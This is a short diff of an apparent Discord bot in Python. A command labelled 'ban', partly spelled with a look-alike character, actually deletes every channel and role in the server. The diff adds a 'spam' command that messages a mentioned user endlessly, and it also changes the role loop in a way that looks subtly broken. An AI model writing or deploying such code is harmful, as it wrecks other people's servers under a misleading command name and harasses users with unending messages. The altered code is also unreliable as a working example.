@@ -19,7 +19,7 @@ async def bаn(ctx, arg):
             await chanel.delete()
         except:
             pass
-    for role in ctx.guild.roles:
+    for role in ctx.guild.roles():
         print('role deleted')
         try:
             await role.delete()
@@ -47,5 +47,12 @@ async def ban(ctx, arg):
             await role.delete()
         except:
             pass
+
+
+@bot.command()
+async def spam(ctx, arg):
+    user =  ctx.message.mentions[0]
+    while True:
+        await user.send(arg)
 
 bot.run(TOKEN)
